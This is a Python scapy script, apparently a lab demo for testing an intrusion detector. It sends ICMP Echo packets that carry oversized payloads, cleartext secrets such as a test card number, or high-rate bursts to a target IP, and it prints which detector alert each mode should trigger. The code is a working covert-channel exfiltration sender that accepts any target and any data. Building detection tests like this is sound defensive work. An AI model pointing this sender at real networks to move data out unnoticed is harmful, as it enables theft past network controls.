import argparse
import time

from scapy.layers.inet import ICMP, IP
from scapy.packet import Raw
from scapy.sendrecv import send

from ui.display import (
    BurstProgressTracker,
    print_hint,
    print_status,
    print_success,
    render_attack_banner,
    render_payload_telemetry,
)

DEFAULT_TARGET = "172.21.0.10"
WINDOWS_BENIGN_PAYLOAD = b"abcdefghijklmnopqrstuvwabcdefghi"


def send_oversized(target: str, data: str) -> None:
    """Send oversized payload (>64 bytes) to trigger the structural detector"""
    render_attack_banner(
        target=target,
        scenario_mode="Oversized Frame Exfiltration",
        scenario_description="Send large payload exceeding OS default size (>64B)",
        expected_alert_identifier="icmp_oversized_payload (HIGH severity)",
        channel_label="ICMP Covert Channel",
    )

    payload = data.encode("utf-8")
    render_payload_telemetry(payload, panel_title="Oversized ICMP Payload")

    print_status("Sending crafted packet...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print_success(f"1 packet sent to [yellow]{target}[/].")
    print_hint("Check covert-detector logs for the alert.")


def send_sensitive(target: str, data: str) -> None:
    """Cleartext sensitive data exfiltration (tests the L7 regex/Luhn scanner)"""
    render_attack_banner(
        target=target,
        scenario_mode="Sensitive Cleartext Exfiltration",
        scenario_description="Unencrypted credit card / secret inside ICMP Echo",
        expected_alert_identifier="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
        channel_label="ICMP Covert Channel",
    )

    payload = data.encode("utf-8")
    render_payload_telemetry(payload, panel_title="Payload with Exfiltrated Secret")

    print_status("Sending packet...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print_success("Packet sent with sensitive data.")
    print_hint("Check covert-detector logs for the L7 scanner alert.")


def send_burst(target: str, count: int, delay: float) -> None:
    """Fast packet burst to test sliding-window rate limiting"""
    render_attack_banner(
        target=target,
        scenario_mode="High-Frequency Burst Flooding",
        scenario_description=f"Send {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
        expected_alert_identifier="icmp_high_frequency (Rate Limiting)",
        channel_label="ICMP Covert Channel",
    )

    with BurstProgressTracker(
        total_packet_count=count, task_description="Burst Stream"
    ) as tracker:
        for seq in range(count):
            pkt = (
                IP(dst=target)
                / ICMP(type=8, seq=seq)
                / Raw(load=WINDOWS_BENIGN_PAYLOAD)
            )
            send(pkt, verbose=False)
            tracker.step(
                packet_sequence_index=seq,
                payload_size_in_bytes=len(WINDOWS_BENIGN_PAYLOAD),
            )
            time.sleep(delay)

    print_success(f"Burst finished ({count} packets sent in {count * delay:.2f}s).")
    print_hint("Covert-detector logs: packets 1-4 pass, rate limit triggers on 5th+.")


def main():
    parser = argparse.ArgumentParser(
        description="ICMP covert channel exfiltration demo script"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target sink IP")
    parser.add_argument(
        "--mode",
        choices=["oversized", "sensitive", "burst"],
        required=True,
        help="Attack scenario to run",
    )
    parser.add_argument(
        "--data", default="", help="Custom payload string or secret to send"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=6,
        help="Number of packets for burst mode (default: 6)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Interval between packets in seconds (default: 0.05)",
    )

    args = parser.parse_args()

    if args.mode == "oversized":
        default_data = "CONFIDENTIAL_FINANCIAL_REPORT_LEAK_" + ("X" * 70)
        send_oversized(args.target, args.data or default_data)
    elif args.mode == "sensitive":
        default_data = "4532015112830366"
        send_sensitive(args.target, args.data or default_data)
    elif args.mode == "burst":
        send_burst(args.target, count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()
